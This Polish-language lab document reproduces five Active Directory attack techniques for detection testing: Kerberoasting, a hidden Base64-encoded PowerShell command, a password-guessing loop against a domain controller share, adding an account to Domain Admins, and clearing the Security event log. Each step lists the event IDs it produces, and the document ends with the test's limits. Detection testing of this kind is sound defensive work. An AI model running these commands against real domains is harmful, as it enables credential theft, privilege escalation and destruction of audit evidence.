# Symulacje ataków — kroki do odtworzenia

## 1. Kerberoasting (T1558.003)

Konto serwisowe `sqlservice` ze skonfigurowanym SPN. Z dowolnej maszyny w domenie:

powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc01.lab.local:1433"


Wymusza żądanie biletu TGS. Detekcja łapie szyfrowanie RC4 (`0x17`) jako sygnał słabszego algorytmu niż domyślny AES.

## 2. Obfuscated PowerShell (T1059.001)

powershell
powershell.exe -WindowStyle Hidden -EncodedCommand <Base64>


Base64 to zakodowana komenda (w teście: nieszkodliwy `Invoke-WebRequest`). Sysmon EID 1 loguje pełne drzewo procesu i CommandLine.

## 3. Kerberos Brute-force (T1110)

powershell
1..15 | ForEach-Object {
    $cred = New-Object System.Management.Automation.PSCredential("lab\sqlservice", (ConvertTo-SecureString "ZleHaslo$_" -AsPlainText -Force))
    New-PSDrive -Name "T$_" -PSProvider FileSystem -Root "\\DC01\C$" -Credential $cred
}


Połączenie po nazwie hosta wymusza Kerberos, nie NTLM — błędne hasło generuje Event ID 4771 (`Failure_Code=0x18`), nie 4625.

## 4. Privilege Escalation (T1098)

powershell
Add-ADGroupMember -Identity "Domain Admins" -Members "sqlservice"
Remove-ADGroupMember -Identity "Domain Admins" -Members "sqlservice" -Confirm:$false


Generuje 4728 (dodanie) i 4729 (usunięcie) dla grupy globalnej. Detekcja ograniczona do grup uprzywilejowanych (Domain Admins, Enterprise Admins itd.), bo samo dodanie do zwykłej grupy nie jest sygnałem ataku.

## 5. Log Clearing (T1070.001)

powershell
wevtutil cl Security


Generuje Event ID 1102 — samo czyszczenie zostawia wpis w świeżo pustym logu. Brak legalnego uzasadnienia biznesowego dla tej akcji w środowisku produkcyjnym.

## Ograniczenia testu

Wszystkie ataki wykonane z konsoli DC01 (nie z osobnej maszyny klienckiej) — `Client_Address` w logach to `::1` (loopback), nie realny adres źródłowy. Próg detekcji dla brute-force (≥5 prób / 2 min) dobrany konserwatywnie, bez kalibracji na danych historycznych.
